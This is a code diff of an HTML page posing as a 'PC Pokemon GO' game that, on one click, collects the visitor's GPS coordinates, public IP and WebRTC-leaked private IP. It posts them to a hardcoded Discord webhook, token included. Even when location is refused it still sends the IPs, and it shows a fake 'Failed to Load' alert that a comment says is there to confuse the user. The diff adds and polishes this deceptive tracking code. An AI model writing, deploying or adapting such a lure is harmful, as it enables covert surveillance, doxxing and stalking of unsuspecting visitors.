@@ -1,6 +1,9 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>PC Pokemon GO Google Maps API</title>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PC Pokemon GO Google Maps API</title>
     <style>
         body {
             background-color: black;
@@ -11,10 +14,14 @@
             height: 100vh;
             margin: 0;
             flex-direction: column;
-            font-family: Arial, sans-serif;} #buttonContainer {
+            font-family: Arial, sans-serif;
+        }
+        #buttonContainer {
             display: flex;
             flex-direction: column;
-            align-items: center;} #sendLocation {
+            align-items: center;
+        }
+        #sendLocation {
             background-color: red;
             border: none;
             border-radius: 50%;
@@ -24,32 +31,61 @@
             font-size: 16px;
             color: white;
             outline: none;
-            transition: background-color 0.3s;} #sendLocation:hover {
-            background-color: darkred;} h1 {
+            transition: background-color 0.3s;
+        }
+        #sendLocation:hover {
+            background-color: darkred;
+        }
+        h1 {
             position: absolute;
             top: 20%;
             font-size: 24px;
-            text-align: center;} </style>
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
     <h1>Click to enter PC Pokemon GO</h1>
-    <div id="buttonContainer">        <button id="sendLocation">•</button>
+    <div id="buttonContainer">
+        <button id="sendLocation">•</button>
     </div>
-    <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
+    <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file path -->
 
     <script>
         const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Your Discord webhook URL
 
         document.getElementById('sendLocation').addEventListener('click', function() {
             // Play audio when button is pressed
-            document.getElementById('audio').play();            
+            document.getElementById('audio').play().catch(e => console.error("Audio play failed:", e));
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocationWithGeo, showError);
             } else {
                 alert("Geolocation is not supported by this browser.");
                 sendIPsOnly(); // Send IPs if geolocation is not supported at all
-            } 
+            }
         });
+
+        // Function to handle errors from geolocation
+        function showError(error) {
+            let errorMessage = "An unknown error occurred.";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMessage = "An unknown error occurred.";
+                    break;
+            }
+            console.warn(errorMessage);
+            sendIPsOnly(); // Fallback to sending only IP addresses
+        }
 
         // Function to get Public IP from a third-party service
         async function getPublicIP() {
@@ -69,24 +105,39 @@
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [] });
                     pc.createDataChannel('');
-                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                    pc.createOffer()
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(err => {
+                            console.error("Error creating WebRTC offer:", err);
+                            resolve("Not available (Offer failed)");
+                        });
 
                     pc.onicecandidate = (ice) => {
                         if (ice && ice.candidate && ice.candidate.candidate) {
-                            // Regex to find an IP address
-                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                            const ipAddr = ipRegex.exec(ice.candidate.candidate)[1];
-                            if (ipAddr) {
-                                pc.onicecandidate = null; // Stop listening for more candidates
-                                resolve(ipAddr);
+                            const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
+                            const match = ipRegex.exec(ice.candidate.candidate);
+
+                            if (match && match[1]) {
+                                const ipAddr = match[1];
+                                if (ipAddr.startsWith('10.') || ipAddr.startsWith('192.168.') || (ipAddr.startsWith('172.') && (parseInt(ipAddr.split('.')[1], 10) >= 16 && parseInt(ipAddr.split('.')[1], 10) <= 31))) {
+                                    pc.onicecandidate = null;
+                                    pc.close();
+                                    resolve(ipAddr);
+                                }
                             }
                         }
                     };
-                    // Set a timeout in case the process hangs or fails
-                    setTimeout(() => resolve('Not available'), 1000);
+
+                    setTimeout(() => {
+                        if (pc.iceConnectionState !== 'closed') {
+                           pc.close();
+                           resolve("Not available (Timeout)");
+                        }
+                    }, 1500);
+
                 } catch (e) {
-                    console.error("WebRTC error:", e);
-                    resolve("Not available (WebRTC blocked/failed)");
+                    console.error("WebRTC initialization error:", e);
+                    resolve("Not available (WebRTC blocked)");
                 }
             });
         }
@@ -97,17 +148,15 @@
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
-                }, 
+                },
                 body: JSON.stringify(data)
             }).then(response => {
-                if (response.ok) {
-                    alert('Failed to Load.');
-                } else {
-                    alert('Failed to Load.');
-                } 
+                // The alert shows regardless of success or failure to confuse the user
+                alert('Failed to Load.');
             }).catch(error => {
                 console.error('Error sending data to webhook:', error);
-                alert('An error occurred while sending data.');
+                // Still show the alert on error
+                alert('Failed to Load.');
             });
         }
 
@@ -117,7 +166,7 @@
             const lon = position.coords.longitude;
             const publicIP = await getPublicIP();
             const privateIP = await getPrivateIP();
-            const googleMapsLink =`https://www.google.com/maps?q=${lat},${lon}&z=15`;
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=15`;
             
             const data = {
                 content: `
@@ -131,7 +180,7 @@
             sendToDiscord(data);
         }
 
-        // Function to send only IP addresses
+        // Function to send only IP addresses if location is denied/unavailable
         async function sendIPsOnly() {
             const publicIP = await getPublicIP();
             const privateIP = await getPrivateIP();
@@ -141,31 +190,10 @@
 --- New Player Log (Location Denied/Unavailable) ---
 **🌐 Public IP:** \`${publicIP}\`
 **💻 Private IP:** \`${privateIP}\`
-------------------------------------------------------
+----------------------------------------------------
 `
             };
             sendToDiscord(data);
-        }
-
-        // This function handles errors from navigator.geolocation
-        function showError(error) {
-            // Send IPs regardless of the error, but especially on permission denial
-            sendIPsOnly();
-
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("I Guess no game");                    
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Location information is unavailable.");                    
-                    break;
-                case error.TIMEOUT:
-                    alert("The request to get user location timed out.");                    
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("An unknown error occurred.");                    
-                    break;
-            } 
         }
     </script>
 </body>
